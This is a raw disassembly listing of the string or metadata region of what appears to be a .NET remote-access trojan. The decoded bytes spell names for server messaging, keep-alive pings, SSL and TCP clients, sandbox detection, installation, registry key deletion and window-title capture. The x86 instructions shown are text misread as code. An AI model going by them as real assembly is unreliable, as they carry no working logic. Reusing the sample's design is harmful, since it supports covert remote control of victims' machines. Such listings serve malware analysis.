  405984:	45                   	inc    %ebp
  405985:	39 39                	cmp    %edi,(%ecx)
  405987:	34 37                	xor    $0x37,%al
  405989:	41                   	inc    %ecx
  40598a:	31 39                	xor    %edi,(%ecx)
  40598c:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  405990:	36 39 38             	cmp    %edi,%ss:(%eax)
  405993:	44                   	inc    %esp
  405994:	38 46 35             	cmp    %al,0x35(%esi)
  405997:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  40599b:	41                   	inc    %ecx
  40599c:	37                   	aaa
  40599d:	32 31                	xor    (%ecx),%dh
  40599f:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4059a5:	43                   	inc    %ebx
  4059a6:	35 38 42 00 47       	xor    $0x47004238,%eax
  4059ab:	43                   	inc    %ebx
  4059ac:	00 45 53             	add    %al,0x53(%ebp)
  4059af:	5f                   	pop    %edi
  4059b0:	53                   	push   %ebx
  4059b1:	59                   	pop    %ecx
  4059b2:	53                   	push   %ebx
  4059b3:	54                   	push   %esp
  4059b4:	45                   	inc    %ebp
  4059b5:	4d                   	dec    %ebp
  4059b6:	5f                   	pop    %edi
  4059b7:	52                   	push   %edx
  4059b8:	45                   	inc    %ebp
  4059b9:	51                   	push   %ecx
  4059ba:	55                   	push   %ebp
  4059bb:	49                   	dec    %ecx
  4059bc:	52                   	push   %edx
  4059bd:	45                   	inc    %ebp
  4059be:	44                   	inc    %esp
  4059bf:	00 45 53             	add    %al,0x53(%ebp)
  4059c2:	5f                   	pop    %edi
  4059c3:	44                   	inc    %esp
  4059c4:	49                   	dec    %ecx
  4059c5:	53                   	push   %ebx
  4059c6:	50                   	push   %eax
  4059c7:	4c                   	dec    %esp
  4059c8:	41                   	inc    %ecx
  4059c9:	59                   	pop    %ecx
  4059ca:	5f                   	pop    %edi
  4059cb:	52                   	push   %edx
  4059cc:	45                   	inc    %ebp
  4059cd:	51                   	push   %ecx
  4059ce:	55                   	push   %ebp
  4059cf:	49                   	dec    %ecx
  4059d0:	52                   	push   %edx
  4059d1:	45                   	inc    %ebp
  4059d2:	44                   	inc    %esp
  4059d3:	00 4d 61             	add    %cl,0x61(%ebp)
  4059d6:	70 4e                	jo     0x405a26
  4059d8:	61                   	popa
  4059d9:	6d                   	insl   (%dx),%es:(%edi)
  4059da:	65 54                	gs push %esp
  4059dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059dd:	4f                   	dec    %edi
  4059de:	49                   	dec    %ecx
  4059df:	44                   	inc    %esp
  4059e0:	00 48 57             	add    %cl,0x57(%eax)
  4059e3:	49                   	dec    %ecx
  4059e4:	44                   	inc    %esp
  4059e5:	00 67 65             	add    %ah,0x65(%edi)
  4059e8:	74 5f                	je     0x405a49
  4059ea:	46                   	inc    %esi
  4059eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4059ec:	72 6d                	jb     0x405a5b
  4059ee:	61                   	popa
  4059ef:	74 49                	je     0x405a3a
  4059f1:	44                   	inc    %esp
  4059f2:	00 45 58             	add    %al,0x58(%ebp)
  4059f5:	45                   	inc    %ebp
  4059f6:	43                   	inc    %ebx
  4059f7:	55                   	push   %ebp
  4059f8:	54                   	push   %esp
  4059f9:	49                   	dec    %ecx
  4059fa:	4f                   	dec    %edi
  4059fb:	4e                   	dec    %esi
  4059fc:	5f                   	pop    %edi
  4059fd:	53                   	push   %ebx
  4059fe:	54                   	push   %esp
  4059ff:	41                   	inc    %ecx
  405a00:	54                   	push   %esp
  405a01:	45                   	inc    %ebp
  405a02:	00 67 65             	add    %ah,0x65(%edi)
  405a05:	74 5f                	je     0x405a66
  405a07:	41                   	inc    %ecx
  405a08:	53                   	push   %ebx
  405a09:	43                   	inc    %ebx
  405a0a:	49                   	dec    %ecx
  405a0b:	49                   	dec    %ecx
  405a0c:	00 53 79             	add    %dl,0x79(%ebx)
  405a0f:	73 74                	jae    0x405a85
  405a11:	65 6d                	gs insl (%dx),%es:(%edi)
  405a13:	2e 49                	cs dec %ecx
  405a15:	4f                   	dec    %edi
  405a16:	00 56 49             	add    %dl,0x49(%esi)
  405a19:	4e                   	dec    %esi
  405a1a:	38 38                	cmp    %bh,(%eax)
  405a1c:	41                   	inc    %ecx
  405a1d:	50                   	push   %eax
  405a1e:	50                   	push   %eax
  405a1f:	00 49 73             	add    %cl,0x73(%ecx)
  405a22:	58                   	pop    %eax
  405a23:	50                   	push   %eax
  405a24:	00 42 44             	add    %al,0x44(%edx)
  405a27:	4f                   	dec    %edi
  405a28:	53                   	push   %ebx
  405a29:	00 45 53             	add    %al,0x53(%ebp)
  405a2c:	5f                   	pop    %edi
  405a2d:	43                   	inc    %ebx
  405a2e:	4f                   	dec    %edi
  405a2f:	4e                   	dec    %esi
  405a30:	54                   	push   %esp
  405a31:	49                   	dec    %ecx
  405a32:	4e                   	dec    %esi
  405a33:	55                   	push   %ebp
  405a34:	4f                   	dec    %edi
  405a35:	55                   	push   %ebp
  405a36:	53                   	push   %ebx
  405a37:	00 67 65             	add    %ah,0x65(%edi)
  405a3a:	74 5f                	je     0x405a9b
  405a3c:	49                   	dec    %ecx
  405a3d:	56                   	push   %esi
  405a3e:	00 73 65             	add    %dh,0x65(%ebx)
  405a41:	74 5f                	je     0x405aa2
  405a43:	49                   	dec    %ecx
  405a44:	56                   	push   %esi
  405a45:	00 47 65             	add    %al,0x65(%edi)
  405a48:	6e                   	outsb  %ds:(%esi),(%dx)
  405a49:	65 72 61             	gs jb  0x405aad
  405a4c:	74 65                	je     0x405ab3
  405a4e:	49                   	dec    %ecx
  405a4f:	56                   	push   %esi
  405a50:	00 4d 54             	add    %cl,0x54(%ebp)
  405a53:	58                   	pop    %eax
  405a54:	00 76 61             	add    %dh,0x61(%esi)
  405a57:	6c                   	insb   (%dx),%es:(%edi)
  405a58:	75 65                	jne    0x405abf
  405a5a:	5f                   	pop    %edi
  405a5b:	5f                   	pop    %edi
  405a5c:	00 52 65             	add    %dl,0x65(%edx)
  405a5f:	61                   	popa
  405a60:	64 53                	fs push %ebx
  405a62:	65 72 76             	gs jb  0x405adb
  405a65:	65 72 74             	gs jb  0x405adc
  405a68:	44                   	inc    %esp
  405a69:	61                   	popa
  405a6a:	74 61                	je     0x405acd
  405a6c:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  405a70:	61                   	popa
  405a71:	00 4d 65             	add    %cl,0x65(%ebp)
  405a74:	73 73                	jae    0x405ae9
  405a76:	61                   	popa
  405a77:	67 65 50             	addr16 gs push %eax
  405a7a:	61                   	popa
  405a7b:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  405a7e:	69 62 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%edx),%esp
  405a85:	72 6c                	jb     0x405af3
  405a87:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  405a8e:	65 6d                	gs insl (%dx),%es:(%edi)
  405a90:	2e 43                	cs inc %ebx
  405a92:	6f                   	outsl  %ds:(%esi),(%dx)
  405a93:	6c                   	insb   (%dx),%es:(%edi)
  405a94:	6c                   	insb   (%dx),%es:(%edi)
  405a95:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  405a9b:	73 2e                	jae    0x405acb
  405a9d:	47                   	inc    %edi
  405a9e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405aa0:	65 72 69             	gs jb  0x405b0c
  405aa3:	63 00                	arpl   %eax,(%eax)
  405aa5:	4d                   	dec    %ebp
  405aa6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405aad:	74 2e                	je     0x405add
  405aaf:	56                   	push   %esi
  405ab0:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  405ab7:	73 69                	jae    0x405b22
  405ab9:	63 00                	arpl   %eax,(%eax)
  405abb:	67 65 74 5f          	addr16 gs je 0x405b1e
  405abf:	53                   	push   %ebx
  405ac0:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ac2:	64 53                	fs push %ebx
  405ac4:	79 6e                	jns    0x405b34
  405ac6:	63 00                	arpl   %eax,(%eax)
  405ac8:	45                   	inc    %ebp
  405ac9:	6e                   	outsb  %ds:(%esi),(%dx)
  405aca:	64 52                	fs push %edx
  405acc:	65 61                	gs popa
  405ace:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  405ad2:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  405ad9:	00 
  405ada:	54                   	push   %esp
  405adb:	68 72 65 61 64       	push   $0x64616572
  405ae0:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  405ae4:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  405ae8:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  405aec:	41                   	inc    %ecx
  405aed:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  405af3:	61                   	popa
  405af4:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  405afa:	74 5f                	je     0x405b5b
  405afc:	43                   	inc    %ebx
  405afd:	6f                   	outsl  %ds:(%esi),(%dx)
  405afe:	6e                   	outsb  %ds:(%esi),(%dx)
  405aff:	6e                   	outsb  %ds:(%esi),(%dx)
  405b00:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b05:	00 67 65             	add    %ah,0x65(%edi)
  405b08:	74 5f                	je     0x405b69
  405b0a:	49                   	dec    %ecx
  405b0b:	73 43                	jae    0x405b50
  405b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  405b0e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b0f:	6e                   	outsb  %ds:(%esi),(%dx)
  405b10:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b15:	00 73 65             	add    %dh,0x65(%ebx)
  405b18:	74 5f                	je     0x405b79
  405b1a:	49                   	dec    %ecx
  405b1b:	73 43                	jae    0x405b60
  405b1d:	6f                   	outsl  %ds:(%esi),(%dx)
  405b1e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  405b20:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b25:	00 52 65             	add    %dl,0x65(%edx)
  405b28:	63 65 69             	arpl   %esp,0x69(%ebp)
  405b2b:	76 65                	jbe    0x405b92
  405b2d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  405b31:	74 5f                	je     0x405b92
  405b33:	47                   	inc    %edi
  405b34:	75 69                	jne    0x405b9f
  405b36:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  405b3a:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  405b41:	64 
  405b42:	53                   	push   %ebx
  405b43:	79 6e                	jns    0x405bb3
  405b45:	63 3e                	arpl   %edi,(%esi)
  405b47:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405b4b:	61                   	popa
  405b4c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b4f:	6e                   	outsb  %ds:(%esi),(%dx)
  405b50:	67 46                	addr16 inc %esi
  405b52:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405b59:	73 43                	jae    0x405b9e
  405b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405b5c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b5d:	6e                   	outsb  %ds:(%esi),(%dx)
  405b5e:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  405b63:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405b68:	61                   	popa
  405b69:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  405b6d:	67 46                	addr16 inc %esi
  405b6f:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  405b76:	65 65 70 41          	gs gs jo 0x405bbb
  405b7a:	6c                   	insb   (%dx),%es:(%edi)
  405b7b:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  405b82:	42                   	inc    %edx
  405b83:	61                   	popa
  405b84:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405b87:	6e                   	outsb  %ds:(%esi),(%dx)
  405b88:	67 46                	addr16 inc %esi
  405b8a:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  405b91:	65 61                	gs popa
  405b93:	64 65 72 53          	fs gs jb 0x405bea
  405b97:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  405b9e:	42                   	inc    %edx
  405b9f:	61                   	popa
  405ba0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  405ba4:	67 46                	addr16 inc %esi
  405ba6:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  405bad:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  405bb4:	42                   	inc    %edx
  405bb5:	61                   	popa
  405bb6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  405bba:	67 46                	addr16 inc %esi
  405bbc:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  405bc3:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405bc7:	61                   	popa
  405bc8:	74 65                	je     0x405c2f
  405bca:	50                   	push   %eax
  405bcb:	6f                   	outsl  %ds:(%esi),(%dx)
  405bcc:	6e                   	outsb  %ds:(%esi),(%dx)
  405bcd:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  405bd3:	61                   	popa
  405bd4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bd7:	6e                   	outsb  %ds:(%esi),(%dx)
  405bd8:	67 46                	addr16 inc %esi
  405bda:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  405be1:	6e                   	outsb  %ds:(%esi),(%dx)
  405be2:	74 65                	je     0x405c49
  405be4:	72 76                	jb     0x405c5c
  405be6:	61                   	popa
  405be7:	6c                   	insb   (%dx),%es:(%edi)
  405be8:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  405bed:	61                   	popa
  405bee:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  405bf2:	67 46                	addr16 inc %esi
  405bf4:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  405bfb:	75 66                	jne    0x405c63
  405bfd:	66 65 72 3e          	data16 gs jb 0x405c3f
  405c01:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c05:	61                   	popa
  405c06:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c09:	6e                   	outsb  %ds:(%esi),(%dx)
  405c0a:	67 46                	addr16 inc %esi
  405c0c:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  405c13:	66 66 73 65          	data16 data16 jae 0x405c7c
  405c17:	74 3e                	je     0x405c57
  405c19:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  405c1d:	61                   	popa
  405c1e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c21:	6e                   	outsb  %ds:(%esi),(%dx)
  405c22:	67 46                	addr16 inc %esi
  405c24:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  405c2b:	73 6c                	jae    0x405c99
  405c2d:	43                   	inc    %ebx
  405c2e:	6c                   	insb   (%dx),%es:(%edi)
  405c2f:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405c36:	5f                   	pop    %edi
  405c37:	42                   	inc    %edx
  405c38:	61                   	popa
  405c39:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c3c:	6e                   	outsb  %ds:(%esi),(%dx)
  405c3d:	67 46                	addr16 inc %esi
  405c3f:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  405c46:	63 70 43             	arpl   %esi,0x43(%eax)
  405c49:	6c                   	insb   (%dx),%es:(%edi)
  405c4a:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  405c51:	5f                   	pop    %edi
  405c52:	42                   	inc    %edx
  405c53:	61                   	popa
  405c54:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  405c57:	6e                   	outsb  %ds:(%esi),(%dx)
  405c58:	67 46                	addr16 inc %esi
  405c5a:	69 65 6c 64 00 68 57 	imul   $0x57680064,0x6c(%ebp),%esp
  405c61:	6e                   	outsb  %ds:(%esi),(%dx)
  405c62:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  405c66:	6e                   	outsb  %ds:(%esi),(%dx)
  405c67:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  405c6b:	70 65                	jo     0x405cd2
  405c6d:	6e                   	outsb  %ds:(%esi),(%dx)
  405c6e:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  405c72:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  405c79:	61 
  405c7a:	6c                   	insb   (%dx),%es:(%edi)
  405c7b:	75 65                	jne    0x405ce2
  405c7d:	4b                   	dec    %ebx
  405c7e:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  405c85:	6c                   	insb   (%dx),%es:(%edi)
  405c86:	61                   	popa
  405c87:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c8a:	43                   	inc    %ebx
  405c8b:	72 65                	jb     0x405cf2
  405c8d:	61                   	popa
  405c8e:	74 65                	je     0x405cf5
  405c90:	49                   	dec    %ecx
  405c91:	6e                   	outsb  %ds:(%esi),(%dx)
  405c92:	73 74                	jae    0x405d08
  405c94:	61                   	popa
  405c95:	6e                   	outsb  %ds:(%esi),(%dx)
  405c96:	63 65 00             	arpl   %esp,0x0(%ebp)
  405c99:	73 65                	jae    0x405d00
  405c9b:	74 5f                	je     0x405cfc
  405c9d:	4d                   	dec    %ebp
  405c9e:	6f                   	outsl  %ds:(%esi),(%dx)
  405c9f:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  405ca4:	6c                   	insb   (%dx),%es:(%edi)
  405ca5:	65 4d                	gs dec %ebp
  405ca7:	6f                   	outsl  %ds:(%esi),(%dx)
  405ca8:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  405cad:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  405cb4:	64 65 
  405cb6:	00 45 6e             	add    %al,0x6e(%ebp)
  405cb9:	74 65                	je     0x405d20
  405cbb:	72 44                	jb     0x405d01
  405cbd:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  405cc1:	4d                   	dec    %ebp
  405cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  405cc3:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  405cc8:	79 70                	jns    0x405d3a
  405cca:	74 6f                	je     0x405d3b
  405ccc:	53                   	push   %ebx
  405ccd:	74 72                	je     0x405d41
  405ccf:	65 61                	gs popa
  405cd1:	6d                   	insl   (%dx),%es:(%edi)
  405cd2:	4d                   	dec    %ebp
  405cd3:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd4:	64 65 00 43 69       	fs add %al,%gs:0x69(%ebx)
  405cd9:	70 68                	jo     0x405d43
  405cdb:	65 72 4d             	gs jb  0x405d2b
  405cde:	6f                   	outsl  %ds:(%esi),(%dx)
  405cdf:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  405ce4:	6c                   	insb   (%dx),%es:(%edi)
  405ce5:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  405cea:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  405cf0:	65 74 65             	gs je  0x405d58
  405cf3:	53                   	push   %ebx
  405cf4:	75 62                	jne    0x405d58
  405cf6:	4b                   	dec    %ebx
  405cf7:	65 79 54             	gs jns 0x405d4e
  405cfa:	72 65                	jb     0x405d61
  405cfc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405d00:	74 5f                	je     0x405d61
  405d02:	4d                   	dec    %ebp
  405d03:	65 73 73             	gs jae 0x405d79
  405d06:	61                   	popa
  405d07:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  405d0c:	74 65                	je     0x405d73
  405d0e:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  405d12:	6e                   	outsb  %ds:(%esi),(%dx)
  405d13:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  405d17:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  405d1e:	6b 65 00 45          	imul   $0x45,0x0(%ebp),%esp
  405d22:	6e                   	outsb  %ds:(%esi),(%dx)
  405d23:	75 6d                	jne    0x405d92
  405d25:	65 72 61             	gs jb  0x405d89
  405d28:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  405d2c:	49                   	dec    %ecx
  405d2d:	44                   	inc    %esp
  405d2e:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  405d35:	6c                   	insb   (%dx),%es:(%edi)
  405d36:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405d3a:	74 5f                	je     0x405d9b
  405d3c:	48                   	dec    %eax
  405d3d:	61                   	popa
  405d3e:	6e                   	outsb  %ds:(%esi),(%dx)
  405d3f:	64 6c                	fs insb (%dx),%es:(%edi)
  405d41:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405d45:	6e                   	outsb  %ds:(%esi),(%dx)
  405d46:	74 69                	je     0x405db1
  405d48:	6d                   	insl   (%dx),%es:(%edi)
  405d49:	65 46                	gs inc %esi
  405d4b:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405d52:	64 6c                	fs insb (%dx),%es:(%edi)
  405d54:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405d58:	74 4d                	je     0x405da7
  405d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405d5b:	64 75 6c             	fs jne 0x405dca
  405d5e:	65 48                	gs dec %eax
  405d60:	61                   	popa
  405d61:	6e                   	outsb  %ds:(%esi),(%dx)
  405d62:	64 6c                	fs insb (%dx),%es:(%edi)
  405d64:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  405d68:	6e                   	outsb  %ds:(%esi),(%dx)
  405d69:	74 69                	je     0x405dd4
  405d6b:	6d                   	insl   (%dx),%es:(%edi)
  405d6c:	65 54                	gs push %esp
  405d6e:	79 70                	jns    0x405de0
  405d70:	65 48                	gs dec %eax
  405d72:	61                   	popa
  405d73:	6e                   	outsb  %ds:(%esi),(%dx)
  405d74:	64 6c                	fs insb (%dx),%es:(%edi)
  405d76:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405d7a:	74 54                	je     0x405dd0
  405d7c:	79 70                	jns    0x405dee
  405d7e:	65 46                	gs inc %esi
  405d80:	72 6f                	jb     0x405df1
  405d82:	6d                   	insl   (%dx),%es:(%edi)
  405d83:	48                   	dec    %eax
  405d84:	61                   	popa
  405d85:	6e                   	outsb  %ds:(%esi),(%dx)
  405d86:	64 6c                	fs insb (%dx),%es:(%edi)
  405d88:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  405d8c:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  405d93:	65 
  405d94:	00 49 6e             	add    %cl,0x6e(%ecx)
  405d97:	73 74                	jae    0x405e0d
  405d99:	61                   	popa
  405d9a:	6c                   	insb   (%dx),%es:(%edi)
  405d9b:	6c                   	insb   (%dx),%es:(%edi)
  405d9c:	46                   	inc    %esi
  405d9d:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  405da4:	6e 
  405da5:	52                   	push   %edx
  405da6:	6f                   	outsl  %ds:(%esi),(%dx)
  405da7:	6c                   	insb   (%dx),%es:(%edi)
  405da8:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  405dac:	6e                   	outsb  %ds:(%esi),(%dx)
  405dad:	64 6f                	outsl  %fs:(%esi),(%dx)
  405daf:	77 73                	ja     0x405e24
  405db1:	42                   	inc    %edx
  405db2:	75 69                	jne    0x405e1d
  405db4:	6c                   	insb   (%dx),%es:(%edi)
  405db5:	74 49                	je     0x405e00
  405db7:	6e                   	outsb  %ds:(%esi),(%dx)
  405db8:	52                   	push   %edx
  405db9:	6f                   	outsl  %ds:(%esi),(%dx)
  405dba:	6c                   	insb   (%dx),%es:(%edi)
  405dbb:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405dbf:	74 41                	je     0x405e02
  405dc1:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  405dc5:	65 57                	gs push %edi
  405dc7:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  405dce:	74 6c                	je     0x405e3c
  405dd0:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405dd4:	74 5f                	je     0x405e35
  405dd6:	4d                   	dec    %ebp
  405dd7:	61                   	popa
  405dd8:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  405ddf:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405de3:	6f                   	outsl  %ds:(%esi),(%dx)
  405de4:	63 65 73             	arpl   %esp,0x73(%ebp)
  405de7:	73 4d                	jae    0x405e36
  405de9:	6f                   	outsl  %ds:(%esi),(%dx)
  405dea:	64 75 6c             	fs jne 0x405e59
  405ded:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405df1:	74 5f                	je     0x405e52
  405df3:	57                   	push   %edi
  405df4:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405dfb:	79 6c                	jns    0x405e69
  405dfd:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405e01:	6f                   	outsl  %ds:(%esi),(%dx)
  405e02:	63 65 73             	arpl   %esp,0x73(%ebp)
  405e05:	73 57                	jae    0x405e5e
  405e07:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  405e0e:	79 6c                	jns    0x405e7c
  405e10:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e14:	74 5f                	je     0x405e75
  405e16:	4e                   	dec    %esi
  405e17:	61                   	popa
  405e18:	6d                   	insl   (%dx),%es:(%edi)
  405e19:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e1d:	74 5f                	je     0x405e7e
  405e1f:	46                   	inc    %esi
  405e20:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e27:	00 
  405e28:	73 65                	jae    0x405e8f
  405e2a:	74 5f                	je     0x405e8b
  405e2c:	46                   	inc    %esi
  405e2d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e34:	00 
  405e35:	47                   	inc    %edi
  405e36:	65 74 54             	gs je  0x405e8d
  405e39:	65 6d                	gs insl (%dx),%es:(%edi)
  405e3b:	70 46                	jo     0x405e83
  405e3d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e44:	00 
  405e45:	47                   	inc    %edi
  405e46:	65 74 46             	gs je  0x405e8f
  405e49:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405e50:	00 
  405e51:	6c                   	insb   (%dx),%es:(%edi)
  405e52:	70 4d                	jo     0x405ea1
  405e54:	6f                   	outsl  %ds:(%esi),(%dx)
  405e55:	64 75 6c             	fs jne 0x405ec4
  405e58:	65 4e                	gs dec %esi
  405e5a:	61                   	popa
  405e5b:	6d                   	insl   (%dx),%es:(%edi)
  405e5c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e60:	74 5f                	je     0x405ec1
  405e62:	4d                   	dec    %ebp
  405e63:	61                   	popa
  405e64:	63 68 69             	arpl   %ebp,0x69(%eax)
  405e67:	6e                   	outsb  %ds:(%esi),(%dx)
  405e68:	65 4e                	gs dec %esi
  405e6a:	61                   	popa
  405e6b:	6d                   	insl   (%dx),%es:(%edi)
  405e6c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e70:	74 5f                	je     0x405ed1
  405e72:	4f                   	dec    %edi
  405e73:	53                   	push   %ebx
  405e74:	46                   	inc    %esi
  405e75:	75 6c                	jne    0x405ee3
  405e77:	6c                   	insb   (%dx),%es:(%edi)
  405e78:	4e                   	dec    %esi
  405e79:	61                   	popa
  405e7a:	6d                   	insl   (%dx),%es:(%edi)
  405e7b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e7f:	74 5f                	je     0x405ee0
  405e81:	46                   	inc    %esi
  405e82:	75 6c                	jne    0x405ef0
  405e84:	6c                   	insb   (%dx),%es:(%edi)
  405e85:	4e                   	dec    %esi
  405e86:	61                   	popa
  405e87:	6d                   	insl   (%dx),%es:(%edi)
  405e88:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  405e8c:	56                   	push   %esi
  405e8d:	61                   	popa
